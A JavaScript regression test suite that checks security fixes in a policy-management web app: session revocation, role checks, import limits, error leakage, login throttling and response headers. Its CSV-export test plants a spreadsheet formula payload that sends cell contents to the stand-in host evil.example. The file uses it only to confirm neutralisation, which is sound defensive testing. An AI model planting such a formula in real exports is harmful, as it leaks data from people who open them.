/* =====================================================================
   Regression tests for the security review fixes.

   Each check corresponds to a specific finding, so if one of these ever
   goes red the thing it protects has come undone. They run against the
   API directly; nothing here depends on the interface.
   ===================================================================== */
import { BASE, ADMIN, MANAGER1, INVESTOR1, scratchPassword, login } from './test-config.mjs';

const fails = [];
const check = (name, ok, extra = '') => {
  console.log(`${ok ? '  PASS' : '  FAIL'}  ${name}${extra ? ` — ${extra}` : ''}`);
  if (!ok) fails.push(name);
};
const api = (cookie, path, opts = {}) =>
  fetch(`${BASE}/api${path}`, {
    ...opts,
    body: opts.body && typeof opts.body !== 'string' ? JSON.stringify(opts.body) : opts.body,
    headers: { Cookie: cookie || '', 'Content-Type': 'application/json', ...(opts.headers || {}) },
  });
const json = async (r) => { try { return await r.json(); } catch { return null; } };
const raw = async (email, password) => fetch(`${BASE}/api/auth/login`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password }),
});

const admin = await login(ADMIN.email, ADMIN.password);

/* ------------------------------------------------------------------ *
 * Finding 5 — a session must not outlive the password it was issued under
 * ------------------------------------------------------------------ */
console.log('PASSWORD CHANGES REVOKE OLD SESSIONS');
const victimEmail = `revoke-probe@test.local`;
const pwA = scratchPassword('a');
const pwB = scratchPassword('b');

const existing = (await json(await api(admin, '/users'))).find((u) => u.email === victimEmail);
if (existing) await api(admin, `/users/${existing.id}`, { method: 'DELETE' });
const victim = await json(await api(admin, '/users', { method: 'POST',
  body: { email: victimEmail, password: pwA, full_name: 'Revoke Probe', role: 'viewer' } }));

// Two separate browsers, both signed in under the old password.
const stolen = await login(victimEmail, pwA);
const theirs = await login(victimEmail, pwA);
check('both sessions work before the change', (await api(stolen, '/policies')).status === 200
  && (await api(theirs, '/policies')).status === 200);

const changed = await api(theirs, '/auth/password', { method: 'POST',
  body: { currentPassword: pwA, newPassword: pwB } });
check('the account owner can change their password', changed.status === 200, `status ${changed.status}`);

const after = await api(stolen, '/policies');
check('a cookie issued under the old password stops working', after.status === 401, `status ${after.status}`);
check('and says why', /password changed/i.test((await json(after))?.error || ''));

// The person who made the change gets a fresh cookie in the response, so they
// stay signed in — check that by replaying the cookie the change handed back.
const reissued = changed.headers.getSetCookie().map((c) => c.split(';')[0]).join('; ');
check('the browser that changed it is re-issued a working cookie',
  (await api(reissued, '/policies')).status === 200);

check('the old password no longer signs in', (await raw(victimEmail, pwA)).status === 401);
check('the new one does', (await raw(victimEmail, pwB)).status === 200);
check('reusing the same password is refused',
  (await api(await login(victimEmail, pwB), '/auth/password', { method: 'POST',
    body: { currentPassword: pwB, newPassword: pwB } })).status === 400);

// An admin reset must do the same — that is the case where somebody else may
// already be holding a live session.
const beforeReset = await login(victimEmail, pwB);
const pwC = scratchPassword('c');
await api(admin, `/users/${victim.id}/password`, { method: 'POST', body: { password: pwC } });
check('an admin reset kills the account\'s existing sessions',
  (await api(beforeReset, '/policies')).status === 401);

await api(admin, `/users/${victim.id}`, { method: 'DELETE' });

/* ------------------------------------------------------------------ *
 * Finding 5 (ordering) — requireRole must never see a stale role
 * ------------------------------------------------------------------ */
console.log('\nAUTHORISATION IS NEVER READ FROM THE TOKEN ALONE');
const probeEmail = 'order-probe@test.local';
const probePw = scratchPassword('order');
const gone = (await json(await api(admin, '/users'))).find((u) => u.email === probeEmail);
if (gone) await api(admin, `/users/${gone.id}`, { method: 'DELETE' });
const probe = await json(await api(admin, '/users', { method: 'POST',
  body: { email: probeEmail, password: probePw, full_name: 'Order Probe', role: 'editor' } }));
const probeCookie = await login(probeEmail, probePw);

// Import is the route that used to run requireRole before the database read.
const csv = 'Policy Number,Last Name,Carrier Name,Basic Face\nHARDEN-1,Probe,Test Carrier,1000\n';
const upload = async (cookie, path = '/import/preview') => {
  const fd = new FormData();
  fd.append('file', new Blob([csv], { type: 'text/csv' }), 'p.csv');
  fd.append('type', 'policies');
  return fetch(`${BASE}/api${path}`, { method: 'POST', headers: { Cookie: cookie }, body: fd });
};
check('an editor may preview an import', (await upload(probeCookie)).status === 200);
await api(admin, `/users/${probe.id}`, { method: 'PUT',
  body: { full_name: 'Order Probe', role: 'viewer', is_active: true } });
check('demoting to viewer blocks import on the same cookie',
  (await upload(probeCookie)).status === 403);
await api(admin, `/users/${probe.id}`, { method: 'PUT',
  body: { full_name: 'Order Probe', role: 'editor', is_active: false } });
check('suspending blocks import on the same cookie',
  (await upload(probeCookie)).status === 401);
await api(admin, `/users/${probe.id}`, { method: 'DELETE' });

/* ------------------------------------------------------------------ *
 * Finding 6 — import is bounded
 * ------------------------------------------------------------------ */
console.log('\nIMPORT IS BOUNDED');
const investor = await login(INVESTOR1.email, INVESTOR1.password);
check('an investor cannot preview an import', (await upload(investor)).status === 403);
check('an investor cannot download a template',
  (await api(investor, '/import/template/policies')).status === 403);
check('an unauthenticated preview is refused', (await upload('')).status === 401);

const big = Buffer.alloc(6 * 1024 * 1024, 'a,b,c\n');
const fdBig = new FormData();
fdBig.append('file', new Blob([big], { type: 'text/csv' }), 'big.csv');
fdBig.append('type', 'policies');
const tooBig = await fetch(`${BASE}/api/import/preview`,
  { method: 'POST', headers: { Cookie: admin }, body: fdBig });
check('a file over the cap is rejected, not buffered', tooBig.status === 413, `status ${tooBig.status}`);
check('and the message says the limit', /5 MB/.test((await json(tooBig))?.error || ''));

/* ------------------------------------------------------------------ *
 * Finding 8 — CSV export cannot carry a formula
 * ------------------------------------------------------------------ */
console.log('\nSPREADSHEET FORMULA INJECTION');
// Plant a hostile carrier name, then read it back the way the grid would.
const hostile = '=HYPERLINK("https://evil.example/"&A1,"click")';
const made = await api(admin, '/policies', { method: 'POST',
  body: { policy_number: `HARDEN-CSV-${Date.now()}`, carrier_name: hostile,
          insured_last_name: 'Csvprobe', fund_code: 'LCG1' } });
check('the hostile value is stored verbatim, not silently mangled', made.status === 201,
  `status ${made.status}`);
const planted = await json(made);
const back = (await json(await api(admin, '/policies'))).find((p) => p.id === planted.id);
check('and comes back over the API unchanged', back.carrier_name === hostile);
// The neutralisation lives in the browser's exportCsv; assert the rule itself.
const csvCell = (value) => {
  let s = String(value ?? '');
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
};
check('a leading = is quoted out', csvCell(hostile).startsWith(`"'=`));
for (const lead of ['+', '-', '@', '\t', '\r'])
  check(`a leading ${JSON.stringify(lead)} is quoted out`, csvCell(`${lead}CMD`).startsWith(`"'${lead}`));
check('an ordinary value is untouched', csvCell('MassMutual') === '"MassMutual"');
check('embedded quotes still escape', csvCell('a"b') === '"a""b"');
await api(admin, `/policies/${planted.id}`, { method: 'DELETE',
  body: { confirm: planted.policy_number } });

/* ------------------------------------------------------------------ *
 * Finding 9 — internal errors stay internal
 * ------------------------------------------------------------------ */
console.log('\nERROR RESPONSES');
const mode = (await json(await fetch(`${BASE}/api/health`)))?.mode;

// A non-numeric id must be turned away before it reaches a query, so Postgres
// never gets the chance to answer with the column type it was expecting.
const bogus = await api(admin, '/policies/not-a-number/values', { method: 'POST',
  body: { as_of_date: '2030-01-01' } });
const bogusBody = JSON.stringify(await json(bogus));
check('a non-numeric id is refused before any query', bogus.status === 404, `status ${bogus.status}`);
check('and names nothing about the database',
  !/syntax|integer|type |relation|column|SELECT|INSERT/i.test(bogusBody), bogusBody.slice(0, 90));

// A genuine server fault: detail is logged, and in production only a reference
// comes back. Outside production the message is kept, because that is the
// environment where somebody is trying to fix it. Provoke one on a policy this
// test owns, so the check does not depend on what is in the fixture.
const faultPolicy = await json(await api(admin, '/policies', { method: 'POST',
  body: { policy_number: `HARDEN-ERR-${Date.now()}`, carrier_name: 'Test Carrier',
          insured_last_name: 'Errprobe', fund_code: 'LCG1' } }));
// A calendar-shaped date that is not a real date: it survives the input
// sanitiser and fails in Postgres, which is exactly the class of unexpected
// error whose message must not reach the browser.
const fault = await api(admin, `/policies/${faultPolicy.id}/values`, { method: 'POST',
  body: { as_of_date: '2030-13-45' } });
const faultBody = await json(fault);
const faultText = JSON.stringify(faultBody);
check('no stack trace ever comes back', !/\.js:\d+|at Object|node_modules/.test(faultText));
if (mode === 'production') {
  check('production returns a generic message', /Something went wrong/.test(faultBody?.error || ''),
    faultBody?.error);
  check('with a reference to quote', typeof faultBody?.ref === 'string' && faultBody.ref.length >= 6,
    faultBody?.ref);
  check('and no database detail',
    !/syntax|relation|column|pg_|SELECT|INSERT/i.test(faultText), faultText.slice(0, 90));
} else {
  console.log('  NOTE  server is in development mode — detailed errors are expected here;');
  console.log('        the generic-message path is asserted when NODE_ENV=production.');
  check('a reference is attached even in development',
    fault.status !== 500 || typeof faultBody?.ref === 'string', faultBody?.ref);
}
check('the fault really was a server error, not a handled one', fault.status === 500,
  `status ${fault.status}`);
await api(admin, `/policies/${faultPolicy.id}`, { method: 'DELETE',
  body: { confirm: faultPolicy.policy_number } });

const notFound = await json(await api(admin, '/policies/99999999'));
check('a missing record says so plainly', /not found/i.test(notFound?.error || ''), notFound?.error);

/* ------------------------------------------------------------------ *
 * Finding 10 — the throttle is shared and persistent
 * ------------------------------------------------------------------ */
console.log('\nLOGIN THROTTLE');
const throttleEmail = 'throttle-probe@test.local';
const oldProbe = (await json(await api(admin, '/users'))).find((u) => u.email === throttleEmail);
if (oldProbe) await api(admin, `/users/${oldProbe.id}`, { method: 'DELETE' });
const throttlePw = scratchPassword('throttle');
const tUser = await json(await api(admin, '/users', { method: 'POST',
  body: { email: throttleEmail, password: throttlePw, full_name: 'Throttle Probe', role: 'viewer' } }));

let sawThrottle = false;
let attempts = 0;
for (; attempts < 12 && !sawThrottle; attempts++)
  sawThrottle = (await raw(throttleEmail, 'definitely-not-the-password')).status === 429;
check('repeated failures are refused', sawThrottle, `after ${attempts} attempts`);
check('the correct password is refused too while throttled',
  (await raw(throttleEmail, throttlePw)).status === 429);
check('other accounts are unaffected', (await raw(ADMIN.email, ADMIN.password)).status === 200);
await api(admin, `/users/${tUser.id}`, { method: 'DELETE' });

/* ------------------------------------------------------------------ *
 * Headers
 * ------------------------------------------------------------------ */
console.log('\nRESPONSE HEADERS');
const head = await fetch(`${BASE}/`);
for (const [h, want] of [
  ['content-security-policy', /default-src 'self'/],
  ['x-content-type-options', /nosniff/],
  ['x-frame-options', /DENY/],
  ['referrer-policy', /same-origin/],
  /* A private portfolio has no business in a search index, and the meta
     tag in index.html only covers that one page. */
  ['x-robots-tag', /noindex/],
]) check(`${h} present`, want.test(head.headers.get(h) || ''), head.headers.get(h) || 'missing');

/* Not only the shell: an export, a drawn PDF, an API response — anything
   a crawler could reach has to carry it, or the header is decoration on
   the one page that already had a meta tag. */
for (const path of ['/api/health', '/styles.css', '/app.js']) {
  const r = await fetch(`${BASE}${path}`);
  check(`${path} carries it too`, /noindex/.test(r.headers.get('x-robots-tag') || ''),
    r.headers.get('x-robots-tag') || 'missing');
}
/* And nothing disallows the crawler from reading that instruction: a
   robots.txt Disallow would hide the noindex and leave the URL listable
   with no snippet, which is the outcome we are trying to avoid. */
const robots = await fetch(`${BASE}/robots.txt`);
const robotsText = await robots.text();
check('robots.txt is a real robots.txt, not the application shell',
  robots.status === 200 && /^User-agent:/m.test(robotsText),
  robotsText.split('\n').filter((l) => l && !l.startsWith('#'))[0] || 'not served');
check('and it does not hide the noindex from the crawler that must read it',
  !/Disallow:\s*\/\s*$/m.test(robotsText),
  (robotsText.match(/Disallow:.*/) || ['none'])[0]);

console.log(fails.length ? `\nFAILED: ${fails.join(', ')}` : '\nALL HARDENING CHECKS PASSED');
process.exit(fails.length ? 1 : 0);
